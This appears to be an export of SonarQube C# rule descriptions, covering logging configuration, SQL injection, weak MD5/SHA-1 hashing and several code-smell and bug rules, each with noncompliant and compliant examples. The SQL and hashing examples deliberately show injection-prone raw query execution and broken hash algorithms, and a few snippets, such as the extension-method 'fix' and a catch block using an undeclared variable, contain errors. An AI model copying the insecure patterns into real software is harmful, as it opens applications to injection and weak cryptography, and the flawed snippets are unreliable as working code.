            Microsoft.Extensions.Logging.Console.IConsoleLoggerSettings consoleSettings = null;
            Microsoft.Extensions.Logging.AzureAppServices.AzureAppServicesDiagnosticsSettings azureSettings = null;
            Microsoft.Extensions.Logging.EventLog.EventLogSettings eventLogSettings = null;

            // An issue will be raised for each call to an ILoggerFactory extension methods adding loggers.
            loggerFactory.AddAzureWebAppDiagnostics(); // Questionable
            loggerFactory.AddAzureWebAppDiagnostics(azureSettings); // Questionable
            loggerFactory.AddConsole(); // Questionable
            loggerFactory.AddConsole(level); // Questionable
            loggerFactory.AddConsole(level, includeScopes); // Questionable
            loggerFactory.AddConsole(filter); // Questionable
            loggerFactory.AddConsole(filter, includeScopes); // Questionable
            loggerFactory.AddConsole(config); // Questionable
            loggerFactory.AddConsole(consoleSettings); // Questionable
            loggerFactory.AddDebug(); // Questionable
            loggerFactory.AddDebug(level); // Questionable
            loggerFactory.AddDebug(filter); // Questionable
            loggerFactory.AddEventLog(); // Questionable
            loggerFactory.AddEventLog(eventLogSettings); // Questionable
            loggerFactory.AddEventLog(level); // Questionable
            loggerFactory.AddEventSourceLogger(); // Questionable

            IEnumerable&lt;ILoggerProvider&gt; providers = null;
            LoggerFilterOptions filterOptions1 = null;
            IOptionsMonitor&lt;LoggerFilterOptions&gt; filterOptions2 = null;

            LoggerFactory factory = new LoggerFactory(); // Questionable
            new LoggerFactory(providers); // Questionable
            new LoggerFactory(providers, filterOptions1); // Questionable
            new LoggerFactory(providers, filterOptions2); // Questionable
        }
    }
}
</pre>
<p><strong>Log4Net</strong></p>
<pre>
using System;
using System.IO;
using System.Xml;
using log4net.Appender;
using log4net.Config;
using log4net.Repository;

namespace Logging
{
    class Log4netLogging
    {
        void Foo(ILoggerRepository repository, XmlElement element, FileInfo configFile, Uri configUri, Stream configStream,
        IAppender appender, params IAppender[] appenders) {
            log4net.Config.XmlConfigurator.Configure(repository); // Questionable
            log4net.Config.XmlConfigurator.Configure(repository, element); // Questionable
            log4net.Config.XmlConfigurator.Configure(repository, configFile); // Questionable
            log4net.Config.XmlConfigurator.Configure(repository, configUri); // Questionable
            log4net.Config.XmlConfigurator.Configure(repository, configStream); // Questionable
            log4net.Config.XmlConfigurator.ConfigureAndWatch(repository, configFile); // Questionable

            log4net.Config.DOMConfigurator.Configure(); // Questionable
            log4net.Config.DOMConfigurator.Configure(repository); // Questionable
            log4net.Config.DOMConfigurator.Configure(element); // Questionable
            log4net.Config.DOMConfigurator.Configure(repository, element); // Questionable
            log4net.Config.DOMConfigurator.Configure(configFile); // Questionable
            log4net.Config.DOMConfigurator.Configure(repository, configFile); // Questionable
            log4net.Config.DOMConfigurator.Configure(configStream); // Questionable
            log4net.Config.DOMConfigurator.Configure(repository, configStream); // Questionable
            log4net.Config.DOMConfigurator.ConfigureAndWatch(configFile); // Questionable
            log4net.Config.DOMConfigurator.ConfigureAndWatch(repository, configFile); // Questionable

            log4net.Config.BasicConfigurator.Configure(); // Questionable
            log4net.Config.BasicConfigurator.Configure(appender); // Questionable
            log4net.Config.BasicConfigurator.Configure(appenders); // Questionable
            log4net.Config.BasicConfigurator.Configure(repository); // Questionable
            log4net.Config.BasicConfigurator.Configure(repository, appender); // Questionable
            log4net.Config.BasicConfigurator.Configure(repository, appenders); // Questionable
        }
    }
}
</pre>
<p><strong>NLog</strong>: configure programmatically</p>
<pre>
namespace Logging
{
    class NLogLogging
    {
        void Foo(NLog.Config.LoggingConfiguration config) {
            NLog.LogManager.Configuration = config; // Questionable, this changes the logging configuration.
        }
    }
}
</pre>
<p><strong>Serilog</strong></p>
<pre>
namespace Logging
{
    class SerilogLogging
    {
        void Foo() {
            new Serilog.LoggerConfiguration(); // Questionable
        }
    }
}
</pre>",Configuring loggers is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a10', 'owasp-a3', 'sans-top25-porous']",SECURITY_HOTSPOT
2017-09-08T12:35:24+0200,"<p>Shifting an integral number by 0 is equivalent to doing nothing but makes the code confusing for maintainers.</p>
<p>If the first operand is an <code>int</code> or <code>uint</code> (32-bit quantity), the shift count is given by the low-order five bits of the
second operand. That is, the actual shift count is 0 to 31 bits.</p>
<p>Note that integral number with a less than 32-bit quantity (e.g. <code>short</code>, <code>ushort</code>...) are implicitly converted to
<code>int</code> before the shifting operation and so the rule for <code>int</code>/<code>uint</code> applies.</p>
<p>If the first operand is a <code>long</code> or <code>ulong</code> (64-bit quantity), the shift count is given by the low-order six bits of the
second operand. That is, the actual shift count is 0 to 63 bits.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void Main()
{
    short s = 1;
    short shortShift1 = (short)(s &lt;&lt; 0); // Noncompliant
    short shortShift1 = (short)(s &lt;&lt; 16); // Compliant as short will be cast to int (16 is between 0 and 31)
    short shortShift3 = (short)(s &lt;&lt; 32); // Noncompliant, this is equivalent to shifting by 1

    int i = 1;
    int intShift1 = i &lt;&lt; 0; // Noncompliant
    int intShift2 = i &lt;&lt; 32; // Noncompliant, this is equivalent to shifting by 1

    long lg = 1;
    long longShift1 = lg &lt;&lt; 0; // Noncompliant
    long longShift2 = lg &lt;&lt; 64; // Noncompliant, this is equivalent to shifting by 1
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void Main()
{
    short s = 1;
    short shortShift1 = s;
    short shortShift1 = (short)(s &lt;&lt; 16);
    short shortShift3 = (short)(s &lt;&lt; 1);

    int i = 1;
    var intShift1 = i;
    var intShift2 = i &lt;&lt; 1;

    long lg = 1;
    var longShift1 = lg;
    var longShift2 = lg &lt;&lt; 1;
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise an issue when the shift by zero is obviously for cosmetic reasons:</p>
<ul>
  <li> When the value shifted is a literal. </li>
  <li> When there is a similar shift at the same position on line before or after. E.g.: </li>
</ul>
<pre>
bytes[loc+0] = (byte)(value &gt;&gt; 8);
bytes[loc+1] = (byte)(value &gt;&gt; 0);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/operators/left-shift-operator"">MSDN Left-shift operator</a> </li>
  <li> <a href=""https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/operators/right-shift-operator"">MSDN Right-shift operator</a> </li>
</ul>",csharpsquid:S2183,cs,C#,"<p>Shifting an integral number by 0 is equivalent to doing nothing but makes the code confusing for maintainers.</p>
<p>If the first operand is an <code>int</code> or <code>uint</code> (32-bit quantity), the shift count is given by the low-order five bits of the
second operand. That is, the actual shift count is 0 to 31 bits.</p>
<p>Note that integral number with a less than 32-bit quantity (e.g. <code>short</code>, <code>ushort</code>...) are implicitly converted to
<code>int</code> before the shifting operation and so the rule for <code>int</code>/<code>uint</code> applies.</p>
<p>If the first operand is a <code>long</code> or <code>ulong</code> (64-bit quantity), the shift count is given by the low-order six bits of the
second operand. That is, the actual shift count is 0 to 63 bits.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void Main()
{
    short s = 1;
    short shortShift1 = (short)(s &lt;&lt; 0); // Noncompliant
    short shortShift1 = (short)(s &lt;&lt; 16); // Compliant as short will be cast to int (16 is between 0 and 31)
    short shortShift3 = (short)(s &lt;&lt; 32); // Noncompliant, this is equivalent to shifting by 1

    int i = 1;
    int intShift1 = i &lt;&lt; 0; // Noncompliant
    int intShift2 = i &lt;&lt; 32; // Noncompliant, this is equivalent to shifting by 1

    long lg = 1;
    long longShift1 = lg &lt;&lt; 0; // Noncompliant
    long longShift2 = lg &lt;&lt; 64; // Noncompliant, this is equivalent to shifting by 1
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void Main()
{
    short s = 1;
    short shortShift1 = s;
    short shortShift1 = (short)(s &lt;&lt; 16);
    short shortShift3 = (short)(s &lt;&lt; 1);

    int i = 1;
    var intShift1 = i;
    var intShift2 = i &lt;&lt; 1;

    long lg = 1;
    var longShift1 = lg;
    var longShift2 = lg &lt;&lt; 1;
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise an issue when the shift by zero is obviously for cosmetic reasons:</p>
<ul>
  <li> When the value shifted is a literal. </li>
  <li> When there is a similar shift at the same position on line before or after. E.g.: </li>
</ul>
<pre>
bytes[loc+0] = (byte)(value &gt;&gt; 8);
bytes[loc+1] = (byte)(value &gt;&gt; 0);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/operators/left-shift-operator"">MSDN Left-shift operator</a> </li>
  <li> <a href=""https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/operators/right-shift-operator"">MSDN Right-shift operator</a> </li>
</ul>",Integral numbers should not be shifted by zero or more than their number of bits-1,[],MINOR,[],BUG
2018-11-29T11:10:36+0100,"<p>Executing SQL queries is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9019"">CVE-2018-9019</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7318"">CVE-2018-7318</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611"">CVE-2017-5611</a> </li>
</ul>
<p><a href=""https://www.owasp.org/index.php/SQL_Injection"">SQL injection</a> is still one of the top 10 security vulnerabilities. Applications that
execute SQL commands should sanitize any externally-provided values used in those commands. Failure to do so could allow an attacker to include input
that changes the query so that unintended commands are executed, or sensitive data is exposed. Instead of trying to sanitize data by hand, SQL binding
mechanisms should be used; they can be relied on to automatically perform a full sanitization.</p>
<p>This rule checks a variety of methods which are susceptible to SQL injection if not used properly. Any SQL query built from a String or a
RawSqlString is considered susceptible. The goal is to guide security code reviews.</p>
<p>The following specific method signatures are tested:</p>
<ul>
  <li> <code>System.Data.SqlClient.SqlCommand.SqlCommand(string, ...)</code> </li>
  <li> <code>System.Data.SqlClient.SqlDataAdapter.SqlDataAdapter(string, ...)</code> </li>
  <li> <code>System.Data.Odbc.OdbcCommand.OdbcCommand(string, ...)</code> </li>
  <li> <code>System.Data.Odbc.OdbcDataAdapter.OdbcDataAdapter(string, ...)</code> </li>
  <li> <code>System.Data.SqlServerCe.SqlCeCommand.SqlCeCommand(string, ...)</code> </li>
  <li> <code>System.Data.SqlServerCe.SqlCeDataAdapter.SqlCeDataAdapter(string, ...)</code> </li>
  <li> <code>System.Data.OracleClient.OracleCommand.OracleCommand(string, ...)</code> </li>
  <li> <code>System.Data.OracleClient.OracleDataAdapter.OracleDataAdapter(string, ...)</code> </li>
  <li> <code>Microsoft.EntityFrameworkCore.RelationalDatabaseFacadeExtensions.ExecuteSqlCommand(...)</code> </li>
  <li> <code>Microsoft.EntityFrameworkCore.RelationalDatabaseFacadeExtensions.ExecuteSqlCommandAsync(...)</code> </li>
  <li> <code>Microsoft.EntityFrameworkCore.RelationalQueryableExtensions.FromSql&lt;TEntity&gt;(System.Linq.IQueryable&lt;TEntity&gt;,
  System.FormattableString)</code> </li>
  <li> <code>System.Data.SqlClient.SqlCommand.CommandText.set</code> </li>
  <li> <code>System.Data.Odbc.OdbcCommand.CommandText.set</code> </li>
  <li> <code>System.Data.SqlServerCe.SqlCeCommand.CommandText.set</code> </li>
  <li> <code>System.Data.OracleClient.OracleCommand.CommandText.set</code> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the SQL query contains any non sanitized input from a user or another untrusted source. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid building queries manually using concatenation or formatting. If you do it anyway, do not include user input in this building process.
  </li>
  <li> Use <a href=""https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet"">parameterized queries, prepared statements, or stored
  procedures</a> whenever possible. </li>
  <li> You may also use ORM frameworks such as Hibernate which, if used correctly, reduce injection risks. </li>
  <li> Avoid executing SQL queries containing unsafe input in stored procedures or functions. </li>
  <li> <a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> every unsafe input. </li>
</ul>
<p>You can also reduce the impact of an attack by using a database account with low privileges.</p>
<h2>Questionable Code Example</h2>
<pre>
public void Foo(DbContext context, string query)
{
    context.Database.ExecuteSqlCommand(query); // Questionable
    context.Query&lt;User&gt;().FromSql(query); // Questionable
}

public void Bar(SqlConnection connection, string query)
{
    SqlCommand command;
    command = new SqlCommand(query); // Questionable

    command.CommandText = query; // Questionable

    SqlDataAdapter adapter;
    adapter = new SqlDataAdapter(query, connection); // Questionable
}
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised in the following cases:</p>
<ul>
  <li> The SQL query is a hard coded string. </li>
  <li> When the SQL query is a FormattableString provided <strong>directly</strong> to <code>ExecuteSqlCommand</code>,
  <code>ExecuteSqlCommandAsync</code> or <code>FromSql</code>. In this case the FormattableString is automatically converted to a parametrized query.
  </li>
</ul>
<pre>
public void Foo(DbContext context, string query, string value, params object[] parameters)
{
    context.Database.ExecuteSqlCommand(""SELECT * FROM mytable""); // No issue raised. The query is hard-coded. Thus no injection is possible.


    context.Database.ExecuteSqlCommand($""SELECT * FROM mytable WHERE mycol={value}""); // No issue raised. The FormattableString is transformed into a parametrized query.
    // However these need to be reviewed
    context.Database.ExecuteSqlCommand($""SELECT * FROM mytable WHERE mycol={value}"", parameters); // Questionable, the FormattableString is evaluated and converted to RawSqlString
    string query = $""SELECT * FROM mytable WHERE mycol={value}""
    context.Database.ExecuteSqlCommand(query); // Questionable, the FormattableString has already been evaluated, it won't be converted to a parametrized query.
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/89"">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/564.html"">MITRE, CWE-564</a> - SQL Injection: Hibernate </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/943.html"">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PgIRAg"">CERT, IDS00-J.</a> - Prevent SQL injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> Derived from FindSecBugs rules <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA"">Potential SQL/JPQL Injection
  (JPA)</a>, <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO"">Potential SQL/JDOQL Injection (JDO)</a>, <a
  href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE"">Potential SQL/HQL Injection (Hibernate)</a> </li>
</ul>",csharpsquid:S2077,cs,C#,"<p>Executing SQL queries is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9019"">CVE-2018-9019</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7318"">CVE-2018-7318</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611"">CVE-2017-5611</a> </li>
</ul>
<p><a href=""https://www.owasp.org/index.php/SQL_Injection"">SQL injection</a> is still one of the top 10 security vulnerabilities. Applications that
execute SQL commands should sanitize any externally-provided values used in those commands. Failure to do so could allow an attacker to include input
that changes the query so that unintended commands are executed, or sensitive data is exposed. Instead of trying to sanitize data by hand, SQL binding
mechanisms should be used; they can be relied on to automatically perform a full sanitization.</p>
<p>This rule checks a variety of methods which are susceptible to SQL injection if not used properly. Any SQL query built from a String or a
RawSqlString is considered susceptible. The goal is to guide security code reviews.</p>
<p>The following specific method signatures are tested:</p>
<ul>
  <li> <code>System.Data.SqlClient.SqlCommand.SqlCommand(string, ...)</code> </li>
  <li> <code>System.Data.SqlClient.SqlDataAdapter.SqlDataAdapter(string, ...)</code> </li>
  <li> <code>System.Data.Odbc.OdbcCommand.OdbcCommand(string, ...)</code> </li>
  <li> <code>System.Data.Odbc.OdbcDataAdapter.OdbcDataAdapter(string, ...)</code> </li>
  <li> <code>System.Data.SqlServerCe.SqlCeCommand.SqlCeCommand(string, ...)</code> </li>
  <li> <code>System.Data.SqlServerCe.SqlCeDataAdapter.SqlCeDataAdapter(string, ...)</code> </li>
  <li> <code>System.Data.OracleClient.OracleCommand.OracleCommand(string, ...)</code> </li>
  <li> <code>System.Data.OracleClient.OracleDataAdapter.OracleDataAdapter(string, ...)</code> </li>
  <li> <code>Microsoft.EntityFrameworkCore.RelationalDatabaseFacadeExtensions.ExecuteSqlCommand(...)</code> </li>
  <li> <code>Microsoft.EntityFrameworkCore.RelationalDatabaseFacadeExtensions.ExecuteSqlCommandAsync(...)</code> </li>
  <li> <code>Microsoft.EntityFrameworkCore.RelationalQueryableExtensions.FromSql&lt;TEntity&gt;(System.Linq.IQueryable&lt;TEntity&gt;,
  System.FormattableString)</code> </li>
  <li> <code>System.Data.SqlClient.SqlCommand.CommandText.set</code> </li>
  <li> <code>System.Data.Odbc.OdbcCommand.CommandText.set</code> </li>
  <li> <code>System.Data.SqlServerCe.SqlCeCommand.CommandText.set</code> </li>
  <li> <code>System.Data.OracleClient.OracleCommand.CommandText.set</code> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the SQL query contains any non sanitized input from a user or another untrusted source. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid building queries manually using concatenation or formatting. If you do it anyway, do not include user input in this building process.
  </li>
  <li> Use <a href=""https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet"">parameterized queries, prepared statements, or stored
  procedures</a> whenever possible. </li>
  <li> You may also use ORM frameworks such as Hibernate which, if used correctly, reduce injection risks. </li>
  <li> Avoid executing SQL queries containing unsafe input in stored procedures or functions. </li>
  <li> <a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> every unsafe input. </li>
</ul>
<p>You can also reduce the impact of an attack by using a database account with low privileges.</p>
<h2>Questionable Code Example</h2>
<pre>
public void Foo(DbContext context, string query)
{
    context.Database.ExecuteSqlCommand(query); // Questionable
    context.Query&lt;User&gt;().FromSql(query); // Questionable
}

public void Bar(SqlConnection connection, string query)
{
    SqlCommand command;
    command = new SqlCommand(query); // Questionable

    command.CommandText = query; // Questionable

    SqlDataAdapter adapter;
    adapter = new SqlDataAdapter(query, connection); // Questionable
}
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised in the following cases:</p>
<ul>
  <li> The SQL query is a hard coded string. </li>
  <li> When the SQL query is a FormattableString provided <strong>directly</strong> to <code>ExecuteSqlCommand</code>,
  <code>ExecuteSqlCommandAsync</code> or <code>FromSql</code>. In this case the FormattableString is automatically converted to a parametrized query.
  </li>
</ul>
<pre>
public void Foo(DbContext context, string query, string value, params object[] parameters)
{
    context.Database.ExecuteSqlCommand(""SELECT * FROM mytable""); // No issue raised. The query is hard-coded. Thus no injection is possible.


    context.Database.ExecuteSqlCommand($""SELECT * FROM mytable WHERE mycol={value}""); // No issue raised. The FormattableString is transformed into a parametrized query.
    // However these need to be reviewed
    context.Database.ExecuteSqlCommand($""SELECT * FROM mytable WHERE mycol={value}"", parameters); // Questionable, the FormattableString is evaluated and converted to RawSqlString
    string query = $""SELECT * FROM mytable WHERE mycol={value}""
    context.Database.ExecuteSqlCommand(query); // Questionable, the FormattableString has already been evaluated, it won't be converted to a parametrized query.
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/89"">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/564.html"">MITRE, CWE-564</a> - SQL Injection: Hibernate </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/943.html"">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PgIRAg"">CERT, IDS00-J.</a> - Prevent SQL injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> Derived from FindSecBugs rules <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA"">Potential SQL/JPQL Injection
  (JPA)</a>, <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO"">Potential SQL/JDOQL Injection (JDO)</a>, <a
  href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE"">Potential SQL/HQL Injection (Hibernate)</a> </li>
</ul>",Executing SQL queries is security-sensitive,[],CRITICAL,"['cert', 'cwe', 'owasp-a1', 'sans-top25-insecure', 'sql']",SECURITY_HOTSPOT
2015-07-27T14:14:23+0200,"<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,
it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash
value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,
MD4, MD6.</p>
<p>This rule tracks usage of the <code>System.Security.Cryptography.CryptoConfig.CreateFromName()</code>, and
<code>System.Security.Cryptography.HashAlgorithm.Create()</code> methods to instantiate MD5, DSA, HMACMD5, HMACRIPEMD160, RIPEMD-160 or SHA-1
algorithms, and of derived class instances of <code>System.Security.Cryptography.SHA1</code> and <code>System.Security.Cryptography.MD5</code>.</p>
<p>Consider using safer alternatives, such as SHA-256, or SHA-3.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var hashProvider1 = new MD5CryptoServiceProvider(); //Noncompliant
var hashProvider2 = (HashAlgorithm)CryptoConfig.CreateFromName(""MD5""); //Noncompliant
var hashProvider3 = new SHA1Managed(); //Noncompliant
var hashProvider4 = HashAlgorithm.Create(""SHA1""); //Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var hashProvider1 = new SHA256Managed();
var hashProvider2 = (HashAlgorithm)CryptoConfig.CreateFromName(""SHA256Managed"");
var hashProvider3 = HashAlgorithm.Create(""SHA256Managed"");
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/328"">MITRE, CWE-328</a> - Reversible One-Way Hash </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/327"">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href=""http://shattered.io/"">SHAttered</a> - The first concrete collision attack against SHA-1. </li>
</ul>",csharpsquid:S2070,cs,C#,"<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,
it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash
value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,
MD4, MD6.</p>
<p>This rule tracks usage of the <code>System.Security.Cryptography.CryptoConfig.CreateFromName()</code>, and
<code>System.Security.Cryptography.HashAlgorithm.Create()</code> methods to instantiate MD5, DSA, HMACMD5, HMACRIPEMD160, RIPEMD-160 or SHA-1
algorithms, and of derived class instances of <code>System.Security.Cryptography.SHA1</code> and <code>System.Security.Cryptography.MD5</code>.</p>
<p>Consider using safer alternatives, such as SHA-256, or SHA-3.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var hashProvider1 = new MD5CryptoServiceProvider(); //Noncompliant
var hashProvider2 = (HashAlgorithm)CryptoConfig.CreateFromName(""MD5""); //Noncompliant
var hashProvider3 = new SHA1Managed(); //Noncompliant
var hashProvider4 = HashAlgorithm.Create(""SHA1""); //Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var hashProvider1 = new SHA256Managed();
var hashProvider2 = (HashAlgorithm)CryptoConfig.CreateFromName(""SHA256Managed"");
var hashProvider3 = HashAlgorithm.Create(""SHA256Managed"");
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/328"">MITRE, CWE-328</a> - Reversible One-Way Hash </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/327"">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href=""http://shattered.io/"">SHAttered</a> - The first concrete collision attack against SHA-1. </li>
</ul>",SHA-1 and Message-Digest hash algorithms should not be used in secure contexts,[],CRITICAL,"['cwe', 'owasp-a6', 'sans-top25-porous', 'spring']",VULNERABILITY
2017-11-14T07:57:43+0100,"<p>It makes little sense to create an extension method when it is possible to just add that method to the class itself.</p>
<p>This rule raises an issue when an extension is declared in the same namespace as the class it is extending.</p>
<h2>Noncompliant Code Example</h2>
<pre>
namespace MyLibrary
{
    public class Foo
    {
        // ...
    }

    public static class MyExtensions
    {
        public static void Bar(this Foo a) // Noncompliant
        {
            // ...
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<p>Using separate namespace:</p>
<pre>
namespace MyLibrary
{
    public class Foo
    {
        // ...
    }
}

namespace Helpers
{
    public static class MyExtensions
    {
        public void Bar()
        {
            // ...
        }
    }
}
</pre>
<p>Merging the method in the class:</p>
<pre>
namespace MyLibrary
{
    public class Foo
    {
        // ...
        public void Bar()
        {
            // ...
        }
    }
}
</pre>",csharpsquid:S4226,cs,C#,"<p>It makes little sense to create an extension method when it is possible to just add that method to the class itself.</p>
<p>This rule raises an issue when an extension is declared in the same namespace as the class it is extending.</p>
<h2>Noncompliant Code Example</h2>
<pre>
namespace MyLibrary
{
    public class Foo
    {
        // ...
    }

    public static class MyExtensions
    {
        public static void Bar(this Foo a) // Noncompliant
        {
            // ...
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<p>Using separate namespace:</p>
<pre>
namespace MyLibrary
{
    public class Foo
    {
        // ...
    }
}

namespace Helpers
{
    public static class MyExtensions
    {
        public void Bar()
        {
            // ...
        }
    }
}
</pre>
<p>Merging the method in the class:</p>
<pre>
namespace MyLibrary
{
    public class Foo
    {
        // ...
        public void Bar()
        {
            // ...
        }
    }
}
</pre>",Extensions should be in separate namespaces,[],MINOR,['confusing'],CODE_SMELL
2017-05-05T12:32:51+0200,"<p>A loop with at most one iteration is equivalent to the use of an <code>if</code> statement to conditionally execute one piece of code. If the
initial intention of the author was really to conditionally execute one piece of code, an <code>if</code> statement should be used instead. If that
was not the initial intention of the author, the body of the loop should be fixed to use the nested <code>return</code>, <code>break</code> or
<code>throw</code> statements in a more appropriate way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 0; i &lt; 10; i++)
{
    Console.WriteLine(i);
    break;  // Noncompliant, loop only executes once
}
...
foreach (var item in items)
{
    return item;  // Noncompliant, loop only executes once
}
...
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int i = 0; i &lt; 10; i++)
{
    Console.WriteLine(i);
}
...
var item = items.FirstOrDefault();
if (item != null)
{
    return item;
}
...
</pre>",csharpsquid:S1751,cs,C#,"<p>A loop with at most one iteration is equivalent to the use of an <code>if</code> statement to conditionally execute one piece of code. If the
initial intention of the author was really to conditionally execute one piece of code, an <code>if</code> statement should be used instead. If that
was not the initial intention of the author, the body of the loop should be fixed to use the nested <code>return</code>, <code>break</code> or
<code>throw</code> statements in a more appropriate way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 0; i &lt; 10; i++)
{
    Console.WriteLine(i);
    break;  // Noncompliant, loop only executes once
}
...
foreach (var item in items)
{
    return item;  // Noncompliant, loop only executes once
}
...
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int i = 0; i &lt; 10; i++)
{
    Console.WriteLine(i);
}
...
var item = items.FirstOrDefault();
if (item != null)
{
    return item;
}
...
</pre>",Loops with at most one iteration should be refactored,[],MAJOR,[],BUG
2015-05-20T05:01:17+0200,"<p>A <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting
it bubble up automatically, but with more code and the additional detriment of leaving maintainers scratching their heads. </p>
<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>
<h2>Noncompliant Code Example</h2>
<pre>
string s = """";
try
{
  s = File.ReadAllText(fileName);
}
catch (Exception e)  // Noncompliant
{
  throw;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
string s = """";
try
{
  s = File.ReadAllText(fileName);
}
catch (Exception e) // Compliant
{
  logger.LogError(e);
  throw;
}
</pre>
<p>or</p>
<pre>
string s = File.ReadAllText(fileName);
</pre>
<h2>Exceptions</h2>
<p>This rule will not generate issues for <code>catch</code> blocks with just <code>throw</code> inside if they are followed by a <code>catch</code>
block for a more general exception type that does more than just rethrowing the exception.</p>
<pre>
var s = """"
try
{
    s = File.ReadAllText(fileName);
}
catch (IOException) // Compliant, if removed will change the logic
{
    throw;
}
catch (Exception)  // Compliant, does more than just rethrow
{
    logger.LogError(e);
    throw;
}
